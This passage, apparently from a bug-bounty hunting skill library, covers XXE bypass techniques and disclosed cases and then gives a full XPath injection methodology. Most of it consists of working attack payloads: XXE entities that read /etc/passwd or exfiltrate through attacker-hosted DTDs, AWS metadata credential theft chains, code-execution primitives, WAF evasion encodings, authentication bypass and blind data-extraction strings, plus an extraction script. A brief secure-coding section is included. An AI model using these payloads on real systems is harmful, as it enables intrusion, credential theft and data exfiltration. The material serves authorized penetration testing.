7. **Microservice XML messaging** — Internal service-to-service communication uses XML (SOAP, custom schemas) and is treated as a "trusted internal" concern, bypassing security review.

---

### Defense: Keyword blacklist (`ENTITY`, `DOCTYPE`, `SYSTEM`)
```xml
<!-- Case variation -->
<!DoCtYpE foo [<!EnTiTy xxe SyStEm "file:///etc/passwd">]>

<!-- Encoding bypass -->
<?xml version="1.0" encoding="UTF-16"?>
(submit the entire payload UTF-16 encoded)

<!-- Parameter entity instead of general entity -->
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com"> %xxe;]>
```

### Defense: WAF blocking XXE patterns
```xml
<!-- Chunked transfer encoding to bypass WAF inspection -->
Transfer-Encoding: chunked

<!-- HTTP request splitting with XML payload spread across chunks -->

<!-- Use XML comments to break signatures -->
<!-–- -->DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>

<!-- Nested encoding -->
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "&#x66;&#x69;&#x6c;&#x65;:///etc/passwd">]>
```

# Try mismatched Content-Type headers
Content-Type: application/json; charset=xml
Content-Type: application/xml+json

### Defense: Input length limits
```xml
<!-- Use billion laughs to test parser limits, and use short file paths -->
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;">
]>
<!-- Escalate to demonstrate DoS if XXE file-read is patched -->
```

---

## Parser-ecosystem vulnerability matrix

XXE classic payloads (`<!ENTITY xxe SYSTEM "file://...">`) are not universally exploitable in 2026. Most mainstream language ecosystems have hardened their default XML parsers since 2018-2024. Fingerprint the target stack BEFORE investing time in XXE — sometimes the parser is already safe and the bug class doesn't apply.

| Ecosystem / parser | Default behavior on SYSTEM entity | Vulnerable by default? |
|---|---|---|
| Java SAX / DOM (`XMLInputFactory` without disabling external entities) | Expands SYSTEM file:// | **YES** |
| Java JAXB / JAX-WS (older Spring versions) | Expands | **YES** |
| PHP `DOMDocument` with `LIBXML_NOENT` flag | Expands SYSTEM | **YES** |
| PHP `simplexml_load_*` with `LIBXML_NOENT` | Expands | **YES** |
| .NET `XmlDocument` with `XmlResolver` explicitly set | Expands | **YES** |
| .NET `XmlReader` with `DtdProcessing=Parse` + `XmlResolver` explicitly set | Expands | **YES** (default since .NET 4.5.2 is `DtdProcessing.Prohibit`, which THROWS on any DOCTYPE — modern default is safe) |
| Python `xml.etree.ElementTree` ≥ 3.7.1 | SYSTEM disabled | NO |
| Python `lxml` (verified 6.x; likely ≥ 5.x) | Drops SYSTEM file content even with `resolve_entities=True`; may still issue network fetches when `no_network=False` | NO for file read (verified locally on 6.1.0 — see `docs/verification/phase2g-saml-mfa-xxe.md`) |
| Python `xml.dom.minidom` | Default safe in current versions | NO |
| Python `defusedxml.lxml` | Disabled | NO |
| Ruby Nokogiri default | Disabled | NO |
| Ruby Nokogiri with `Nokogiri::XML::ParseOptions::DTDLOAD` | Expands | **YES** |
| Apache Struts (older) | Often expands | **YES** |
| Embedded IoT / industrial XML processors (firmware) | Frequently vulnerable | **YES** |
| Microsoft Office OOXML processors that re-parse user content | Vulnerable in some legacy paths | **YES** |

**Fingerprint signals to look for:**

- `Server: Apache Tomcat`, `X-Powered-By: Servlet` → Java backend → **likely YES**
- `X-Powered-By: PHP/...` + endpoint that ingests XML → **likely YES** if app uses `DOMDocument`
- `Server: Microsoft-IIS` with `.aspx` and XML SOAP → **likely YES** on legacy code
- Server says nothing identifiable + endpoint accepts XML → **probe with `&hello;` first**; if the inline entity expands, escalate to SYSTEM. If the inline entity also fails to expand, the parser may be hardened — pivot.

**Pre-Severity Gate:** before claiming XXE on a candidate endpoint, run the inline-entity probe (`<!ENTITY hello "world!">` then `&hello;` in a node). If `hello!` does NOT echo back, parser-level entity expansion is disabled and SYSTEM file:// won't work either. Don't waste cycles on a hardened parser.

---

## Gate 0 Validation

Before writing the report, answer all three:

1. **What can the attacker DO right now?**
   - Can you show the contents of `/etc/passwd` or `win.ini` in the response? OR can you demonstrate a confirmed OOB callback with a file's contents transmitted to your server? OR can you reach an internal SSRF endpoint (metadata, internal admin)?

2. **What does the victim LOSE?**
   - Specific sensitive data must be identified: internal credentials, AWS IAM keys, application config files with DB passwords, PII, or internal network topology. "Parser made a DNS request" alone is insufficient — escalate to demonstrate actual data exposure or internal access.

3. **Can it be reproduced in 10 minutes from scratch?**
   - You must have a single `curl` command or Burp repeater request that a triage engineer can run against the live target and see the impact within 10 minutes, with zero ambiguity about the vulnerable parameter and endpoint.

---

### Scenario A: Single Endpoint → 26 Domains Compromised (Uber-scale)
A tester discovered an XML parsing endpoint on one Uber subdomain. The backend processed XML using a vulnerable parser, and the server made outbound HTTP requests to attacker-controlled infrastructure (blind OOB). Because the vulnerable XML processing service was a shared internal microservice, the same vulnerability was reachable through 26+ different public-facing domains — all sharing the backend. A single payload could read `/etc/passwd`, internal config files, and reach AWS metadata endpoints, effectively giving access to credentials reusable across the entire infrastructure.

**Business impact**: Full internal service compromise across the majority of the production domain fleet; potential for credential theft and lateral movement.

### Scenario B: Document Upload → Local File Read on Twitter-scale Platform
An attacker uploaded a crafted XML-based document (e.g., SVG or Office format) to a document processing feature on a major social platform. The server-side parser processed the embedded DTD and external entity references, returning local file contents in the parsed output or error messages. The attacker could read application config files containing database connection strings, internal API keys, and potentially private user data stored on the same filesystem.

**Business impact**: Exposure of production secrets (database credentials, API keys) via a feature intended for harmless file uploads; no authentication bypass required beyond a standard user account.

### Scenario C: JSON API → Hidden XML Parser → SSRF to Internal Services
A REST API endpoint nominally accepting JSON was found to also parse requests submitted as `application/xml`. The underlying service converted XML to an internal format using an unpatched Java `DocumentBuilderFactory`. By injecting a SYSTEM entity pointing at `http://10.0.0.x` address ranges, the tester could probe internal services, reach an unauthenticated internal admin panel, and retrieve AWS instance metadata including temporary IAM credentials — all through a single API call requiring only a valid session token.

**Business impact**: Complete AWS credential compromise from a single authenticated API call, enabling privilege escalation from application-level user to cloud infrastructure administrator.

---

## Disclosed Report Citations (Backfill +6 — 2016-2024)

The following real, verified bug-bounty / coordinated-disclosure cases extend this skill. Three cases (#7, #9, #10) are OOB-required (blind) — they cross-reference the `hunt-ssrf` OOB-Or-It-Didn't-Happen Gate and cannot be claimed without a Collaborator/interactsh callback.

5. **Mail.ru — Pulse RSS/Atom feed XXE (file read)** ([H1 #505947](https://hackerone.com/reports/505947))
    - Subclass: direct file-read XXE (in-band)
    - Payload: `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>` inside RSS feed body → `<title>&xxe;</title>` reflected in response
    - Root cause: pulse.mail.ru RSS/Atom ingestion called an XML parser with `external general entities` enabled
    - Year: 2019 — **$6,000**

6. **Twitter — sms-be-vip.twitter.com SOAP/SXMP servlet XXE** ([H1 #248668](https://hackerone.com/reports/248668))
    - Subclass: SOAP XXE (cloudhopper SXMP servlet) — confirmed via HTTP callback **and** reflected file read
    - Payload: `<!DOCTYPE r [<!ENTITY % ext SYSTEM "http://attacker/x.dtd"> %ext;]>` chained in SXMP request body
    - Root cause: Cloudhopper SXMP servlet parsed inbound XML with default JAXP settings (entities resolved)
    - Year: 2017 — **$10,080** (classic SOAP-XXE reference case)

7. **Zivver — SVG profile-picture upload XXE → SSRF** ([H1 #897244](https://hackerone.com/reports/897244))
    - Subclass: SVG-upload XXE, OOB-confirmed, chains to SSRF
    - Payload: SVG with `<!DOCTYPE svg [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><text>&xxe;</text>`
    - Root cause: server thumbnailed uploaded SVG with an XML parser that resolved external entities; no entity-resolver shutdown
    - Year: 2020 — Zivver had no paid program at the time

8. **Open-Xchange — Blind XXE via PowerPoint (.pptx) import** ([H1 #334488](https://hackerone.com/reports/334488))
    - Subclass: Office-doc XXE (PPTX = ZIP of XML parts), OOB-required
    - Payload: modify `ppt/slides/slide1.xml` inside the .pptx ZIP to include `<!DOCTYPE x [<!ENTITY % a SYSTEM "http://attacker/d.dtd"> %a;]>`; external DTD chains parameter entities to exfil `file:///etc/passwd` over HTTP
    - Root cause: PowerPoint parser pre-rendered the XML parts of the OOXML container before disabling entity resolution
    - Year: 2018 — **$2,000**

9. **Uber — Blind OOB XXE on ubermovement.com** ([H1 #154096](https://hackerone.com/reports/154096))
    - Subclass: blind OOB XXE (third-party vendor product), OOB-required
    - Payload: `<!DOCTYPE r [<!ENTITY ping SYSTEM "http://attacker.example/">]><search><q>&ping;</q></search>`
    - Root cause: generic XML endpoint in Movement's vendor stack accepted XML and resolved system entities; no data exfil possible (sandboxed), only blind ping
    - Year: 2016 — **$500**

10. **Adobe Commerce / Magento — "CosmicSting" CVE-2024-34102** ([Assetnote writeup](https://www.assetnote.io/resources/research/why-nested-deserialization-is-harmful-magento-xxe-cve-2024-34102))
    - Subclass: XXE-to-RCE (nested deserialization → XXE in Laminas request body) — modern, exploited in the wild
    - Payload: REST API JSON request whose nested `simplexml_load_string()` reaches `<!DOCTYPE r [<!ENTITY % d SYSTEM "http://attacker/x.dtd"> %d;]>`; external DTD reads `app/etc/env.php` (admin crypt-key) and POSTs it back; key forges admin token → RCE
    - Root cause: `Laminas\Http\PhpEnvironment\Request` deserialized `simplexml_load_string` on attacker-controlled body without `LIBXML_NOENT` protections
    - Year: 2024 — Adobe HackerOne bounty paid, CVSS 9.8

---

## Related Skills & Chains

- **`hunt-ssrf`** — XXE is SSRF-with-XML-syntax once you discover the parser fetches external entities. Chain primitive: blind XXE OOB `<!ENTITY % x SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/role">` → exfil AWS IMDS creds via parameter-entity DTD callback → STS AssumeRole chain. Where pure SSRF is filter-blocked, `gopher://` via XXE-in-`libxml2` can still reach Redis/SMTP.
- **`hunt-file-upload`** — XXE most often hides inside file-upload features that quietly parse XML (DOCX/XLSX/PPTX, SVG, GPX, KML, OOXML, SOAP attachments). Chain primitive: upload DOCX with malicious `[Content_Types].xml` containing parameter-entity DTD → OOB file read of `/etc/passwd` / `web.config` / `.aws/credentials` via the document parser running server-side.
- **`hunt-rce`** — XXE → RCE is rare but real on PHP (`expect://`), Java (XSLT extensions with `<xsl:script>`/Xalan), and older XmlSpy/SAXON deployments. Chain primitive: XXE in a Java endpoint using a vulnerable XSLT processor → `<xsl:value-of select="rt:exec(rt:getRuntime(),'id')"/>` → RCE; or PHP XXE with `expect://id` stream wrapper enabled → direct RCE.
- **`hunt-sharepoint`** — On-prem SharePoint/Exchange/IIS stacks have a long history of XXE in SOAP/CSOM/EWS endpoints. Chain primitive: anonymous XXE in `_vti_bin/*.asmx` or EWS SOAP → read `web.config` → recover `<machineKey>` → ViewState deserialization → RCE (the ToolShell-adjacent precondition).
- **`security-arsenal`** — Reach for the XXE payload tree: standard SYSTEM file read, parameter-entity OOB DTD pattern (the `%` indirection that makes blind XXE work), `php://filter/convert.base64-encode/resource=` for binary-safe read, XInclude (`<xi:include href=...>`) when DOCTYPE is blocked, billion-laughs/quadratic-blowup for DoS, and the `jar://` / `netdoc://` Java-specific wrappers.
- **`triage-validation`** — Apply the Reproducibility + Pre-Severity Gates. An XXE that only triggers an OOB DNS callback with NO data exfil is Low/Medium (information disclosure of "this parser fetches entities"), not Critical. Critical needs proof of file read or internal HTTP — show the actual `/etc/passwd` content or the IMDS JSON response in the report.


### From `normal-skills/xpath-injection.md`

name: xpath-injection
description: Comprehensive XPath injection testing methodology covering node selection bypass, string extraction via union operators, blind character-by-character extraction, count enumeration, and advanced XML document traversal with optimized payloads and detection techniques.
version: 1.0.0
---

## Overview

XPath Injection is an attack technique used to exploit applications that construct XPath queries from user-supplied input to query XML data stores. When an application fails to properly sanitize input before embedding it into an XPath expression, attackers can manipulate the query logic to bypass authentication, extract arbitrary XML node values, enumerate document structure, or access unauthorized data.

**XPath Query Structure Context:**
- **Node Selection:** `/root/user/username` (absolute), `//user/username` (descendant), `//username` (anywhere)
- **Predicates (Filters):** `//user[username='admin' and password='secret']`
- **Operators:** `|` (union), `or`, `and`, `not()`, `=`, `!=`, `<`, `>`, `<=`, `>=`
- **Functions:** `substring()`, `string-length()`, `count()`, `normalize-space()`, `contains()`, `starts-with()`
- **Wildcards/Axes:** `*`, `node()`, `@*` (attribute), `child::`, `parent::`, `descendant::`

**Target Indicators:**
- Applications using XML databases (eXist-db, BaseX, MarkLogic)
- Legacy systems, SAML parsers, SOAP endpoints, RSS/Atom feed processors
- Config files stored as XML, user data in `.xml` format
- Error messages containing `XPathException`, `Invalid expression`, `XPTY0004`, `XPDY0002`

---

### 1.1 Initial Fuzzing & Error-Based Detection

Inject syntax-breaking characters into all XML-relevant parameters (query strings, POST bodies, headers, SOAP envelopes).

**Syntax Breakers:**
```
'
"
\
]
)
}
//
/*
||  (injection point for union in some contexts)
```

**Error Signatures to Monitor:**
- `javax.xml.xpath.XPathExpressionException`
- `System.Xml.XPath.XPathException`
- `XPath syntax error`
- `Unclosed string`
- `Invalid token`
- `Unexpected token`
- `XQuery/XPath static error`

**Optimized Detection Payloads (Minimal to Maximal):**

| Context | Payload | Expected Behavior |
|---------|---------|-------------------|
| String context | `'` | Error or changed result set |
| String context | `''` | No error (escaped single quote) |
| String context | `"` | Error (double quote break) |
| String context | `'"` | Error (mixed quote break) |
| Numeric context | `+` | Error or math evaluation |
| Numeric context | `1/0` | Division by zero error |
| Boolean context | `or 1=1` | All nodes returned |
| Boolean context | `and 1=2` | Empty result set |

### 1.2 Boolean-Based Fingerprinting

Determine if the query result affects application logic (login, search, display).

**True Condition:**
```
' or '1'='1
" or "1"="1
' or 1=1 or '
' or true() or '
' or string-length('a')=1 or '
```

**False Condition:**
```
' and '1'='2
" and "1"="2
' and 1=2 and '
' and false() and '
' and string-length('a')=2 and '
```

**Response Differentiation:**
- True: Application returns data, redirects to dashboard, shows "Welcome", displays search results
- False: Empty results, "Invalid credentials", "No records found", generic error

### 1.3 XPath-Specific Fingerprinting

Differentiate XPath from SQL injection by testing XPath-specific syntax that SQL parsers reject.

**XPath-Only Payloads:**
```
' or count(/)=1 or '   (True if document has 1 root)
' or count(/*)=1 or '  (True if root has 1 child element)
' or local-name(/*)='html' or '  (Reveals root element name)
' or name(/*)='root' or '
' or string-length(name(/*))>0 or '
' or count(//*)>10 or '  (True if >10 nodes exist)
' or count(//text())>0 or '
```

**If these execute without SQL syntax errors → Confirms XPath injection.**

### 1.4 Comment/Concatenation Fingerprinting

XPath 1.0 has no comment syntax, but some implementations support XQuery-style comments or tolerate unexpected closures.

**Closure Testing:**
```
' or '1'='1' ]         (Closes predicate)
' or '1'='1' )         (Closes function/grouping)
' or '1'='1' ] | //node[ '   (Union attempt)
```

---

### 2.1 Authentication Bypass (Boolean Logic Manipulation)

Manipulate the predicate filter to evaluate to true regardless of actual credentials.

**Standard Login Query Structure:**
```xpath
//users/user[username='INPUT_USER' and password='INPUT_PASS']
```

**Bypass Payloads:**

| Scenario | Payload (Username) | Payload (Password) | Resulting XPath |
|----------|-------------------|-------------------|-----------------|
| Single quote string | `admin' or '1'='1` | anything | `//user[username='admin' or '1'='1' and password='anything']` |
| Comment simulation via closure | `admin' or '1'='1' ] | `anything` | `//user[username='admin' or '1'='1']` |
| True condition injection | `' or '1'='1` | `' or '1'='1` | Both predicates true |
| Numeric bypass | `1 or 1=1` | `1 or 1=1` | Numeric evaluation true |
| `true()` function | `' or true() or '` | `' or true() or '` | Boolean true |
| `position()` manipulation | `'] | //user[1] | //user['` | `'] | //user[1] | //user['` | Returns first user node |

**Optimized Authentication Bypass (Single Payload):**
```
' or true() or '
' or 1=1 or '
' or 'a'='a
' or string(.)='' or '
' or position()=1 or '
' or count(ancestor::*)>=0 or '
```

**Advanced: Bypass with Node Existence Check**
```
' or //admin or '
' or //user[1] or '
' or //*[1] or '
```

### 2.2 Authorization Bypass

Bypass row-level access controls by expanding the node selection scope.

**Original Query:**
```xpath
//data/record[owner='current_user' and id='INPUT_ID']
```

**Bypass:**
```
1' or '1'='1' or '//record[public='true' or '1'='1
1' or owner!='nonexistent' or '
1' or not(owner='restricted') or '
```

### 2.3 Parent/Child Traversal for Access Control Bypass

Escape the intended node context to access parent or sibling nodes.

**Payloads:**
```
' or parent::* or '
' or ancestor::* or '
' or ancestor-or-self::* or '
' or preceding-sibling::* or '
' or following-sibling::* or '
```

---

### 3.1 Union-Based Data Extraction (`|`)

The union operator `|` concatenates node-sets. If the application displays the first text node of the result, unions can append sensitive nodes to the query output.

**Query Structure Assumption:**
```xpath
//catalog/book[title='INPUT']/title
```

**Extraction Payloads:**

| Goal | Payload | Extracted Data |
|------|---------|---------------|
| Extract all passwords | `'] | //password | //foo['` | All `<password>` node text values |
| Extract all usernames | `'] | //username | //foo['` | All `<username>` node text values |
| Extract root children | `'] | /*/* | //foo['` | All direct children of root |
| Extract all text | `'] | //text() | //foo['` | All text nodes in document |
| Extract attributes | `'] | //@* | //foo['` | All attribute values |
| Extract specific attribute | `'] | //user/@password | //foo['` | Password attribute values |
| Extract comment nodes | `'] | //comment() | //foo['` | XML comments (often contain credentials) |

**Optimized Union Extraction (Generic Template):**
```
'] | //*[local-name()='password'] | //*[local-name()='passwd'] | //*[local-name()='pwd'] | //foo['
'] | //*[contains(local-name(), 'pass')] | //foo['
'] | //*[contains(local-name(), 'cred')] | //foo['
'] | //*[contains(local-name(), 'secret')] | //foo['
'] | //*[contains(local-name(), 'key')] | //foo['
'] | //comment() | //foo['
'] | //processing-instruction() | //foo['
```

### 3.2 Context-Aware Union Injection

Adapt the union payload based on the injection point within the XPath expression.

**Injection in Predicate:**
```xpath
//users/user[username='INPUT' and active='1']
```
Payload: `'] | //password | //user[username='dummy`

**Injection in Node Test:**
```xpath
//users/user[username='INPUT']
```
Payload: `'] | //password | //users/user[username='dummy`

**Injection in Function Argument:**
```xpath
substring(//user[username='INPUT']/bio, 1, 100)
```
Payload: `'], 1, 100) | //password | //user[username='dummy`

### 3.3 Multi-Node Enumeration via Union

Systematically enumerate document structure using union with position indexing.

```
'] | //*[position()=1] | //foo['
'] | //*[position()=2] | //foo['
'] | //*[position()=3] | //foo['
'] | //*[$i] | //foo['   (Iterate $i)
```

---

## Phase 4: Blind Extraction (Substring Functions)

When union injection fails or the application returns boolean/numeric responses only, use blind extraction with substring functions to steal data character-by-character.

### 4.1 Boolean-Based Blind Extraction

**Methodology:** Ask true/false questions about each character's ASCII value.

**Core Functions:**
- `substring(string, start, length)` — Extract substring
- `string-length(string)` — Determine string length
- `string(node)` — Convert node to string
- `codepoints-to-string()` / `string-to-codepoints()` (XPath 2.0+)
- `translate()` — Character mapping/filtering

**Query Template:**
```xpath
//users/user[username='INPUT' and substring(password,1,1)='a']/username
```

**Optimized Binary Search Payloads (Minimize Requests):**

| Technique | Payload | Logic |
|-----------|---------|-------|
| Character equality | `'] and substring(//user[1]/password,1,1)='a' or '//user[username='` | True if 1st char is 'a' |
| ASCII comparison | `'] and ascii(substring(//user[1]/password,1,1))>100 or '//user[username='` | Binary search range |
| String-length check | `'] and string-length(//user[1]/password)=8 or '//user[username='` | Determine length first |
| Substring match | `'] and starts-with(//user[1]/password,'adm') or '//user[username='` | Prefix enumeration |

**Full Character Set Iteration (Optimized Order):**
Test characters in frequency order: `e, t, a, o, i, n, s, r, h, l, d, c, u, m, f, p, g, w, y, b, v, k, x, j, q, z, 0-9, _, -, @, .`

**Binary Search ASCII Extraction (XPath 2.0+ with `codepoint-equal`):**
```
'] and string-to-codepoints(substring(//password,1,1))>64 or '//
'] and string-to-codepoints(substring(//password,1,1))>96 or '//
'] and string-to-codepoints(substring(//password,1,1))>112 or '//
'] and string-to-codepoints(substring(//password,1,1))=112 or '//
```

**XPath 1.0 Compatible (No `ascii()` function):**
```
'] and substring(//password,1,1)>'a' or '//
'] and substring(//password,1,1)>'n' or '//
'] and substring(//password,1,1)='s' or '//
```

### 4.2 Error-Based Blind Extraction

Force XPath processing errors that leak information through error messages.

**Integer Overflow / Type Coercion:**
```
' and string-length(//password)>0 and '1' + //password + '1
```
If `//password` contains non-numeric text, some engines throw type conversion errors revealing the value.

**Invalid Node Construction:**
```
' and //password and '1
```
Some implementations concatenate or stringify nodes in error contexts.

**Optimized Error Payloads:**
```
' + //user[1]/password + '
' - //user[1]/password - '
' * //user[1]/password * '
' div //user[1]/password div '
```

### 4.3 Time-Based Blind Extraction

When boolean and error channels are unavailable, induce delays via heavy computation (implementation-dependent).

**XPath 1.0 (Limited native support):**
Most XPath 1.0 engines don't support sleep functions. Rely on:
- Extremely large node-set operations
- Deep recursive axes
- Heavy string manipulation

**XPath 2.0+ Time Functions (if available):**
```
' and (if (substring(//password,1,1)='a') then current-dateTime() else current-dateTime()) or '
```
(Note: Pure XPath rarely supports direct time delays; this is more applicable in XQuery contexts.)

**Alternative: Heavy Computation Delay**
```
' and count(//node()//node()//node()//node())>0 or '
' and string-length(normalize-space(//.))>0 or '
```

---

### 5.1 Node Count Enumeration

Determine the size of the XML document and specific node collections to scope the attack surface.

**Count Functions:**
- `count(node-set)` — Number of nodes in set
- `last()` — Position of last node in current context
- `position()` — Current node position

**Enumeration Payloads:**

| Target | Payload | Reveals |
|--------|---------|---------|
| Total elements | `'] and count(//*)=50 or '//user[username='` | Total element nodes |
| Children of root | `'] and count(/*/*)=5 or '//user[username='` | Root's direct children |
| Specific node type | `'] and count(//user)=10 or '//user[username='` | Number of users |
| Text nodes | `'] and count(//text())>100 or '//user[username='` | Text node count |
| Attribute nodes | `'] and count(//@*)>50 or '//user[username='` | Attribute count |
| Comments | `'] and count(//comment())>0 or '//user[username='` | Presence of comments |
| Processing instructions | `'] and count(//processing-instruction())>0 or '//user[username='` | PI count |

**Binary Search Optimization for Count:**
```
'] and count(//*)>1000 or '//
'] and count(//*)>500 or '//
'] and count(//*)>750 or '//
'] and count(//*)>625 or '//
```
(Converge on exact count in ~log2(N) requests)

### 5.2 Document Depth Enumeration

Determine XML tree depth for structural mapping.

```
'] and count(ancestor::*)=0 or '//   (Root level)
'] and count(ancestor::*)=1 or '//
'] and count(ancestor::*)=2 or '//
'] and count(//descendant::*)>50 or '//
```

### 5.3 String Length Enumeration

Before blind character extraction, determine the length of target strings to optimize extraction loops.

```
'] and string-length(//user[1]/password)=8 or '//
'] and string-length(//user[1]/password)>4 or '//
'] and string-length(string(//user[1]))>100 or '//
'] and string-length(normalize-space(//user[1]/bio))>50 or '//
```

**Length Binary Search:**
```
'] and string-length(//password)>32 or '//
'] and string-length(//password)>16 or '//
'] and string-length(//password)>24 or '//
'] and string-length(//password)>20 or '//
'] and string-length(//password)>22 or '//
'] and string-length(//password)=23 or '//
```

---

### 6.1 Node Name Enumeration

Extract element and attribute names when the schema is unknown.

**Local Name Extraction (Character by Character):**
```
'] and substring(local-name(/*),1,1)='r' or '//
'] and substring(local-name(/*),1,1)='r' and substring(local-name(/*),2,1)='o' or '//
'] and substring(local-name(/*),1,2)='ro' or '//
```

**Namespace URI Extraction:**
```
'] and substring(namespace-uri(/*),1,1)='h' or '//
'] and contains(namespace-uri(/*),'http') or '//
```

### 6.2 Attribute Enumeration

Discover and extract attributes even when element names are known.

**Discover Attributes of a Node:**
```
'] and count(//user[1]/@*)>3 or '//
'] and string-length(name(//user[1]/@*[1]))>4 or '//
'] and substring(name(//user[1]/@*[1]),1,1)='i' or '//
```

**Extract Attribute Values:**
```
'] and //user[1]/@password or '//
'] and string(//user[1]/@password) or '//
'] and substring(//user[1]/@password,1,1)='a' or '//
```

### 6.3 Conditional Logic (XPath 2.0+ / XQuery)

If the backend supports XPath 2.0 or XQuery, more powerful constructs are available.

**If-Then-Else:**
```
'] and (if (substring(//password,1,1)='a') then true() else false()) or '//
```

**Regular Expressions (matches()):**
```
'] and matches(//password,'^admin') or '//
'] and matches(string(//user[1]),'password|secret|key') or '//
```

**Ordered Node Access:**
```
'] and //user[1] is //user[last()] or '//
'] and //user[2] >> //user[1] or '//
```

### 6.4 XML External Entity (XXE) via XPath Context

Some XPath evaluators are vulnerable to XXE when parsing the XML document itself.

**Indicator:** If the application loads XML files based on user input or evaluates XPath against user-supplied XML.

**XXE via XPath Document Function:**
```
' and doc('file:///etc/passwd') or '
' and doc('http://attacker.com/exfil') or '
' and unparsed-text('file:///etc/passwd') or '
```

**Note:** This crosses into XXE territory but is relevant when XPath injection exists in document-loading contexts.

### 6.5 XPath to Code Execution (Rare Contexts)

In certain environments (PHP with `libxml2`, Java Xalan, .NET XslCompiledTransform), XPath extensions can lead to code execution.

**PHP `php:function()`:**
```
' and php:function('system','id') or '
' and php:function('file_get_contents','/etc/passwd') or '
```

**Java `java.lang.Runtime`:**
```
' and java:java.lang.Runtime.getRuntime().exec('calc.exe') or '
```

**.NET `msxsl:script`:**
```
' and msxsl:script('C#', 'System.Diagnostics.Process.Start("calc")') or '
```

---

### 7.1 Encoding Obfuscation

**URL Encoding:**
```
%27%20%6f%72%20%27%31%27%3d%27%31
```

**Double URL Encoding:**
```
%2527%2520%256f%2572%2520%2527%2531%2527%253d%2527%2531
```

**Unicode Normalization:**
```
%EF%BC%87 (Fullwidth quote ＇)
%u0027 (Unicode escape)
```

**HTML Entities:**
```
&apos; or &apos;1&apos;=&apos;1
&#39; or &#39;1&#39;=&#39;1
&#x27; or &#x27;1&#x27;=&#x27;1
```

### 7.2 Case Variation & Whitespace

XPath is case-sensitive for node names but functions can sometimes tolerate creative spacing.

```
'OR'1'='1
'  or  '1'='1
'	or	'1'='1
'/**/or/**/'1'='1
```

### 7.3 Alternative Operators & Functions

**Replace `or` / `and`:**
```
' | //* | '          (Union instead of OR in node-set contexts)
' + //* + '          (Numeric coercion)
' = //* = '          (Equality chains)
```

**Replace `substring()`:**
```
substring-before(//password,'a')
substring-after(//password,'a')
```

**Replace `=`:**
```
' and contains(//password,'a') or '
' and starts-with(//password,'adm') or '
' and not(//password!='admin') or '
```

### 7.6 Filter Evasion for Specific Characters

If `(` or `)` is blocked:
```
' or '1'='1' ]       (Avoids parentheses)
' or true() = ' or '1'='1   (Use = instead of AND/OR grouping)
```

If `//` is blocked (axis traversal):
```
' or descendant::* or '
' or /child::node()/child::* or '
```

If `*` is blocked:
```
' or node() or '
' or //text() or '
' or //element() or '   (XPath 2.0)
```

---

### 8.1 Manual Testing Checklist

For each parameter identified as potentially XPath-backed:

1. **Fuzz with syntax breakers** (`'`, `"`, `]`, `)`, `|`, `//`)
2. **Confirm injection** with true/false differential responses
3. **Fingerprint XPath** using `count(/)`, `local-name()`, `name()`
4. **Attempt union extraction** with `| //node | //foo`
5. **If union fails, switch to blind** with `substring()` binary search
6. **Enumerate counts** first (`count()`, `string-length()`)
7. **Map document structure** (node names, attributes, depth)
8. **Extract high-value targets** (passwords, keys, tokens, PII)
9. **Test for XXE/code execution** if environment permits
10. **Document evidence** with request/response pairs

### 8.2 Automation Script Logic (Python Pseudocode)

```python
def blind_extract(payload_template, target_node, max_length=50):
    result = ""
    for pos in range(1, max_length + 1):
        # Determine length first
        low, high = 32, 126
        while low <= high:
            mid = (low + high) // 2
            payload = payload_template.format(
                target=target_node, pos=pos, char=mid
            )
            if execute(payload):  # True response
                low = mid + 1
                found = mid
            else:
                high = mid - 1
        if found == 32:  # No printable char found
            break
        result += chr(found)
    return result

### 8.3 Recommended Tools

| Tool | Purpose | Notes |
|------|---------|-------|
| **Burp Suite** | Proxy, Repeater, Intruder | Essential for manual differential analysis |
| **SQLMap** | `--technique=X` | Limited XPath support; useful for boolean/union patterns |
| **XCat** | Dedicated XPath extraction | Python tool for blind XPath injection |
| **Custom Python scripts** | Blind extraction automation | Required for complex binary search |
| **Burp BApp: HackBar** | Quick payload injection | Useful for encoding/transforms |
| **Postman / curl** | SOAP/XML endpoint testing | For API-based XPath contexts |

---

### 9.1 Secure Coding Patterns

**Parameterized XPath (Java):**
```java
XPath xpath = XPathFactory.newInstance().newXPath();
XPathExpression expr = xpath.compile("//users/user[username=$user and password=$pass]");
expr.evaluate(doc, new Object[]{sanitizedUser, sanitizedPass});
```

**Parameterized XPath (.NET):**
```csharp
XPathExpression expr = nav.Compile("//users/user[username=$user and password=$pass]");
XPathNodeIterator nodes = nav.Select(expr);
```

**Input Validation (Whitelist):**
- Allow only alphanumeric characters for usernames
- Reject `|`, `'`, `"`, `[`, `]`, `(`, `)`, `/`, `@`, `*`, `=`, `<`, `>`

**Alternative: Use DOM APIs instead of XPath for simple lookups.**

### 9.2 Verification Steps for Fix Validation

1. **Resubmit all attack payloads** — Confirm no error leakage, no data extraction
2. **Test true/false differential** — `or 1=1` should not change result semantics
3. **Test union injection** — `| //password` should not append data
4. **Test blind extraction** — `substring()` in predicate should be rejected or neutered
5. **Verify error handling** — Generic errors only, no XPath stack traces
6. **Check logging** — Ensure injection attempts are logged for monitoring

### 9.3 Defense-in-Depth

- **Least Privilege XML:** Application should only access necessary XML documents
- **Web Application Firewall:** Deploy rules for `|`, `//`, `substring`, `count` in user input
- **Output Encoding:** Never reflect XPath results directly without encoding
- **Error Handling:** Catch `XPathException` and return generic messages

---

## Quick Reference: Optimized Payload Matrix

| Objective | Payload | Context |
|-----------|---------|---------|
| **Detect** | `'` | Any string parameter |
| **Confirm** | `' or '1'='1` vs `' and '1'='2` | Boolean logic context |
| **Bypass Auth** | `' or true() or '` | Login forms |
| **Extract via Union** | `'] \| //password \| //foo['` | Display/echo context |
| **Blind Char Extraction** | `'] and substring(//pwd,1,1)='a' or '//` | Boolean blind |
| **Count Nodes** | `'] and count(//*)>50 or '//` | Enumeration |
| **String Length** | `'] and string-length(//pwd)=8 or '//` | Pre-extraction sizing |
| **Node Name** | `'] and substring(local-name(/*),1,1)='r' or '//` | Schema discovery |
| **Attribute Value** | `'] and substring(//@password,1,1)='a' or '//` | Attribute extraction |
| **WAF Bypass** | `%27%20or%20%27%31%27%3d%27%31` | Filtered environments |
